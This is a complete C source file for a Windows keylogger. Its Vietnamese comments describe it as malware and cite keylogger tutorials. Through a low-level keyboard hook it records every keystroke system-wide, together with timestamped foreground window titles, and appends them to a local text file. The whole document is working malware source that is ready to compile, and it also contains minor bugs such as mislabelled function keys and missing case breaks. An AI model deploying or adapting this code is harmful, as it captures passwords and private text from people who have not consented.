#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#pragma warning(disable : 4996)
#pragma comment(lib, "User32.Lib")


/*
** - Sử dụng Windows Hooking (SetWindowsHookEx) để đăng ký hook. Có 2 loại event bàn phím:
**		+ WH_KEYBOARD: triển khai thủ tục hook ở một DLL (thông thường)
**		+ WH_KEYBOARD_LL: không cần triển khai thủ tục hook ở một DLL
** - Khi người dùng nhấn phím, thủ tục hook được gọi. Malware tiến hành log lại phím
** - Loại Hook này là Windows Event/Message Hook, cần phân biệt nó với API Hooking

** 1. SetWindowsHookEx-Keylogger by Alexander Rymdeko-Harvey
	https://github.com/killswitch-GUI/SetWindowsHookEx-Keylogger
** 2. Keylogger using window hooks by William Hemsworth
	https://www.daniweb.com/programming/software-development/code/217096/keylogger-using-window-hooks
** 3. Windows Keylogger Part 1: Attack on user land
	https://eyeofrablog.wordpress.com/2017/06/11/windows-keylogger-part-1-attack-on-user-land/
** 4. Windows keylogger in C by Undev Ninja
	https://codereview.stackexchange.com/questions/46980/windows-keylogger-in-c
	https://0x00sec.org/t/windows-keylogging-part-i
	https://0x00sec.org/t/windows-keylogging-part-ii
** 5. Understanding the Message Loop
	http://www.winprog.org/tutorial/message_loop.html
*/

// KeyBoard hook handle in global scope
HHOOK KeyboardHook;

// Shift Key
BOOL shift = FALSE;

// Windows Title Text
char cWindowTitle[1000];

// NULL is ok
HWND lastWindow = NULL;

// File Path
TCHAR filePath[MAX_PATH];

// Write logs to file
void WriteToLog(char* buffer)
{
	char c_filePath[MAX_PATH];
	wcstombs(c_filePath, filePath, MAX_PATH);

	FILE* fptr = NULL;
	fptr = fopen(c_filePath, "a+");
	fprintf(fptr, buffer);
	fclose(fptr);
}

// All hooks must be unhooked!
void unhookKeyboard()
{
	UnhookWindowsHookEx(KeyboardHook);
	exit(0);
}

void HookCode(DWORD code, BOOL caps, BOOL shift, char* key)
{
	/*
	Translate the return code from hook and
	return the std::string rep of the the code.
	ex. 0x88 -> "[SHIFT]"
	caps = Caps lock on
	shift = Shift key pressed
	WinUser.h = define statments
	LINK = https://msdn.microsoft.com/en-us/library/dd375731(v=VS.85).aspx
	*/

	switch (code) // SWITCH ON INT
	{
		// Char keys for ASCI
		// No VM Def in header 
	case 0x41: strcpy(key, caps ? (shift ? "a" : "A") : (shift ? "A" : "a")); break;
	case 0x42: strcpy(key, caps ? (shift ? "b" : "B") : (shift ? "B" : "b")); break;
	case 0x43: strcpy(key, caps ? (shift ? "c" : "C") : (shift ? "C" : "c")); break;
	case 0x44: strcpy(key, caps ? (shift ? "d" : "D") : (shift ? "D" : "d")); break;
	case 0x45: strcpy(key, caps ? (shift ? "e" : "E") : (shift ? "E" : "e")); break;
	case 0x46: strcpy(key, caps ? (shift ? "f" : "F") : (shift ? "F" : "f")); break;
	case 0x47: strcpy(key, caps ? (shift ? "g" : "G") : (shift ? "G" : "g")); break;
	case 0x48: strcpy(key, caps ? (shift ? "h" : "H") : (shift ? "H" : "h")); break;
	case 0x49: strcpy(key, caps ? (shift ? "i" : "I") : (shift ? "I" : "i")); break;
	case 0x4A: strcpy(key, caps ? (shift ? "j" : "J") : (shift ? "J" : "j")); break;
	case 0x4B: strcpy(key, caps ? (shift ? "k" : "K") : (shift ? "K" : "k")); break;
	case 0x4C: strcpy(key, caps ? (shift ? "l" : "L") : (shift ? "L" : "l")); break;
	case 0x4D: strcpy(key, caps ? (shift ? "m" : "M") : (shift ? "M" : "m")); break;
	case 0x4E: strcpy(key, caps ? (shift ? "n" : "N") : (shift ? "N" : "n")); break;
	case 0x4F: strcpy(key, caps ? (shift ? "o" : "O") : (shift ? "O" : "o")); break;
	case 0x50: strcpy(key, caps ? (shift ? "p" : "P") : (shift ? "P" : "p")); break;
	case 0x51: strcpy(key, caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break;
	case 0x52: strcpy(key, caps ? (shift ? "r" : "R") : (shift ? "R" : "r")); break;
	case 0x53: strcpy(key, caps ? (shift ? "s" : "S") : (shift ? "S" : "s")); break;
	case 0x54: strcpy(key, caps ? (shift ? "t" : "T") : (shift ? "T" : "t")); break;
	case 0x55: strcpy(key, caps ? (shift ? "u" : "U") : (shift ? "U" : "u")); break;
	case 0x56: strcpy(key, caps ? (shift ? "v" : "V") : (shift ? "V" : "v")); break;
	case 0x57: strcpy(key, caps ? (shift ? "w" : "W") : (shift ? "W" : "w")); break;
	case 0x58: strcpy(key, caps ? (shift ? "x" : "X") : (shift ? "X" : "x")); break;
	case 0x59: strcpy(key, caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break;
	case 0x5A: strcpy(key, caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break;

		// Sleep Key
	case VK_SLEEP: strcpy(key, "[SLEEP]"); break;
		// Num Keyboard
	case VK_NUMPAD0:	strcpy(key, "0"); break;
	case VK_NUMPAD1:	strcpy(key, "1"); break;
	case VK_NUMPAD2:	strcpy(key, "2"); break;
	case VK_NUMPAD3:	strcpy(key, "3"); break;
	case VK_NUMPAD4:	strcpy(key, "4"); break;
	case VK_NUMPAD5:	strcpy(key, "5"); break;
	case VK_NUMPAD6:	strcpy(key, "6"); break;
	case VK_NUMPAD7:	strcpy(key, "7"); break;
	case VK_NUMPAD8:	strcpy(key, "8"); break;
	case VK_NUMPAD9:	strcpy(key, "9"); break;
	case VK_MULTIPLY:	strcpy(key, "*"); break;
	case VK_ADD:		strcpy(key, "+"); break;
	case VK_SEPARATOR:	strcpy(key, "-"); break;
	case VK_SUBTRACT:	strcpy(key, "-"); break;
	case VK_DECIMAL:	strcpy(key, "."); break;
	case VK_DIVIDE:		strcpy(key, "/"); break;

		// Function Keys
	case VK_F1:  strcpy(key, "[F1]"); break;
	case VK_F2:  strcpy(key, "[F2]"); break;
	case VK_F3:  strcpy(key, "[F3]"); break;
	case VK_F4:  strcpy(key, "[F4]"); break;
	case VK_F5:  strcpy(key, "[F5]"); break;
	case VK_F6:  strcpy(key, "[F6]"); break;
	case VK_F7:  strcpy(key, "[F7]"); break;
	case VK_F8:  strcpy(key, "[F8]"); break;
	case VK_F9:  strcpy(key, "[F9]"); break;
	case VK_F10:  strcpy(key, "[F10]"); break;
	case VK_F11:  strcpy(key, "[F11]"); break;
	case VK_F12:  strcpy(key, "[F12]"); break;
	case VK_F13:  strcpy(key, "[F13]"); break;
	case VK_F14:  strcpy(key, "[F14]"); break;
	case VK_F15:  strcpy(key, "[F15]"); break;
	case VK_F16:  strcpy(key, "[F16]"); break;
	case VK_F17:  strcpy(key, "[F17]"); break;
	case VK_F18:  strcpy(key, "[F18]"); break;
	case VK_F19:  strcpy(key, "[F19]"); break;
	case VK_F20:  strcpy(key, "[F20]"); break;
	case VK_F21:  strcpy(key, "[F22]"); break;
	case VK_F22:  strcpy(key, "[F23]"); break;
	case VK_F23:  strcpy(key, "[F24]"); break;
	case VK_F24:  strcpy(key, "[F25]"); break;

		// Keys
	case VK_NUMLOCK: strcpy(key, "[NUM-LOCK]"); break;
	case VK_SCROLL:  strcpy(key, "[SCROLL-LOCK]"); break;
	case VK_BACK:    strcpy(key, "[BACK]"); break;
	case VK_TAB:     strcpy(key, "[TAB]"); break;
	case VK_CLEAR:   strcpy(key, "[CLEAR]"); break;
	case VK_RETURN:  strcpy(key, "[ENTER]"); break;
	case VK_SHIFT:   strcpy(key, "[SHIFT]"); break;
	case VK_CONTROL: strcpy(key, "[CTRL]"); break;
	case VK_MENU:    strcpy(key, "[ALT]"); break;
	case VK_PAUSE:   strcpy(key, "[PAUSE]"); break;
	case VK_CAPITAL: strcpy(key, "[CAP-LOCK]"); break;
	case VK_ESCAPE:  strcpy(key, "[ESC]"); break;
	case VK_SPACE:   strcpy(key, "[SPACE]"); break;
	case VK_PRIOR:   strcpy(key, "[PAGEUP]"); break;
	case VK_NEXT:    strcpy(key, "[PAGEDOWN]"); break;
	case VK_END:     strcpy(key, "[END]"); break;
	case VK_HOME:    strcpy(key, "[HOME]"); break;
	case VK_LEFT:    strcpy(key, "[LEFT]"); break;
	case VK_UP:      strcpy(key, "[UP]"); break;
	case VK_RIGHT:   strcpy(key, "[RIGHT]"); break;
	case VK_DOWN:    strcpy(key, "[DOWN]"); break;
	case VK_SELECT:  strcpy(key, "[SELECT]"); break;
	case VK_PRINT:   strcpy(key, "[PRINT]"); break;
	case VK_SNAPSHOT: strcpy(key, "[PRTSCRN]"); break;
	case VK_INSERT:  strcpy(key, "[INS]"); break;
	case VK_DELETE:  strcpy(key, "[DEL]"); break;
	case VK_HELP:    strcpy(key, "[HELP]"); break;

		// Number Keys with shift
	case 0x30:  strcpy(key, shift ? "!" : "0"); break;
	case 0x31:  strcpy(key, shift ? "@" : "1"); break;
	case 0x32:  strcpy(key, shift ? "#" : "2"); break;
	case 0x33:  strcpy(key, shift ? "$" : "3"); break;
	case 0x34:  strcpy(key, shift ? "%" : "4"); break;
	case 0x35:  strcpy(key, shift ? "^" : "5"); break;
	case 0x36:  strcpy(key, shift ? "&" : "6"); break;
	case 0x37:  strcpy(key, shift ? "*" : "7"); break;
	case 0x38:  strcpy(key, shift ? "(" : "8"); break;
	case 0x39:  strcpy(key, shift ? ")" : "9"); break;

		// Windows Keys
	case VK_LWIN:     strcpy(key, "[WIN]"); break;
	case VK_RWIN:     strcpy(key, "[WIN]"); break;
	case VK_LSHIFT:   strcpy(key, "[SHIFT]"); break;
	case VK_RSHIFT:   strcpy(key, "[SHIFT]"); break;
	case VK_LCONTROL: strcpy(key, "[CTRL]"); break;
	case VK_RCONTROL: strcpy(key, "[CTRL]"); break;

		// OEM Keys with shift
	case VK_OEM_1:      strcpy(key, shift ? ":" : ";"); break;
	case VK_OEM_PLUS:   strcpy(key, shift ? "+" : "="); break;
	case VK_OEM_COMMA:  strcpy(key, shift ? "<" : ","); break;
	case VK_OEM_MINUS:  strcpy(key, shift ? "_" : "-"); break;
	case VK_OEM_PERIOD: strcpy(key, shift ? ">" : "."); break;
	case VK_OEM_2:      strcpy(key, shift ? "?" : "/"); break;
	case VK_OEM_3:      strcpy(key, shift ? "~" : "`"); break;
	case VK_OEM_4:      strcpy(key, shift ? "{" : "["); break;
	case VK_OEM_5:      strcpy(key, shift ? "\\" : "|"); break;
	case VK_OEM_6:      strcpy(key, shift ? "}" : "]"); break;
	case VK_OEM_7:      strcpy(key, shift ? "'" : "'"); break;

	case VK_PLAY:       strcpy(key, "[PLAY]");
	case VK_ZOOM:       strcpy(key, "[ZOOM]");
	case VK_OEM_CLEAR:  strcpy(key, "[CLEAR]");
	case VK_CANCEL:     strcpy(key, "[CTRL-C]");

	default: strcpy(key, "[UNK-KEY]"); break;
	}

}

void DayOfWeek(int code, char* name)
{
	switch (code)
	{
	case 0:		strcpy(name, "SUNDAY");		break;
	case 1:		strcpy(name, "MONDAY");		break;
	case 2:		strcpy(name, "TUESDAY");	break;
	case 3:		strcpy(name, "WENSDAY");	break;
	case 4:		strcpy(name, "THURSDAY");	break;
	case 5:		strcpy(name, "FRIDAY");		break;
	case 6:		strcpy(name, "SATURDAY");	break;
	default:	strcpy(name, "FUCKDAY");	break;
	}
}

void GetCurrentTimeSystem_(char* buffer)
{
	SYSTEMTIME t;
	GetLocalTime(&t);
	int day = t.wDay;
	int month = t.wMonth;
	int year = t.wYear;
	int hour = t.wHour;
	int min = t.wMinute;
	int sec = t.wSecond;
	int dayName = t.wDayOfWeek;

	// Build our output header
	char dayOfWeek[15] = { 0 };
	DayOfWeek(dayName, dayOfWeek);
	sprintf(buffer, "%s - %d/%d/%d - %d:%d:%d ", dayOfWeek, day, month, year, hour, min, sec);
}

LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
{
	BOOL caps = FALSE;
	SHORT capsShort = GetKeyState(VK_CAPITAL);
	if (capsShort > 0) {
		// If the high-order bit is 1, the key is down; otherwise, it is up
		caps = TRUE;
	}
	/*
	WH_KEYBOARD_LL uses the LowLevelKeyboardProc Call Back
	LINK = https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
	*/
	// LowLevelKeyboardProc Structure

	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

	// Do the wParam and lParam parameters contain information about a keyboard message.
	if (nCode == HC_ACTION)
	{
		// Messsage data is ready for pickup
		// Check for SHIFT key
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
		{
			// WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
			if (wParam == WM_KEYDOWN) {
				shift = TRUE;
			}
			if (wParam == WM_KEYUP) {
				shift = FALSE;
			}
			else {
				shift = FALSE;
			}
		}

		// Start Loging keys now we are setup
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
		{
			// Retrieves a handle to the foreground window (the window with which the user is currently working).
			HWND currentWindow = GetForegroundWindow();

			// Check if we need to write new window output
			if (currentWindow != lastWindow)
			{
				char bufferTime[100] = { 0 };
				GetCurrentTimeSystem_(bufferTime);

				// Get Windows Title (currently working via handle)
				int c = GetWindowTextA(GetForegroundWindow(), cWindowTitle, sizeof(cWindowTitle));
				printf("\n [%s] [%s] ", bufferTime, cWindowTitle);

				char newLine[] = "\n";
				WriteToLog(newLine);

				char buffWindowTitle[1000] = { 0 };
				sprintf(buffWindowTitle, "[%s] [%s] ", bufferTime, cWindowTitle);
				WriteToLog(buffWindowTitle);

				// Setup for next CallBack
				lastWindow = currentWindow;
			}

			// Now capture keys
			if (p->vkCode)
			{
				char key_[20] = { 0 };
				HookCode(p->vkCode, caps, shift, key_);
				printf("%s", key_);
				WriteToLog(key_);
			}
			// Final output logic
		}
	}
	// hook procedure must pass the message *Always*
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main()
{
	GetCurrentDirectoryW(MAX_PATH, filePath);
	wsprintfW(filePath, TEXT("%s\\hooking-keylogger.txt"), filePath);

	// Start the hook of the keyboard
	KeyboardHook = SetWindowsHookExW(
		WH_KEYBOARD_LL,			// low-level keyboard input events. Không yêu cầu triển khai thủ tục hook ở một DLL
		HookProcedure,			// Pointer to the hook procedure
		GetModuleHandle(NULL),	// A handle to the DLL containing the hook procedure 
		NULL					// Desktop apps, if this parameter is zero
	);

	if (!KeyboardHook) {
		// Hook returned NULL and failed
		printf(" [!] Failed to get handle from SetWindowsHookExW().\n");
	}
	else {
		printf(" [*] KeyCapture handle ready.\n");
		MSG Msg;
		while (GetMessage(&Msg, NULL, 0, 0) > 0)
		{
			// Translates virtual-key messages into character messages.
			TranslateMessage(&Msg);
			// Dispatches a message to a window procedure.
			DispatchMessage(&Msg);
		}
	}
	unhookKeyboard();
	// Exit if failure
	return 0;
}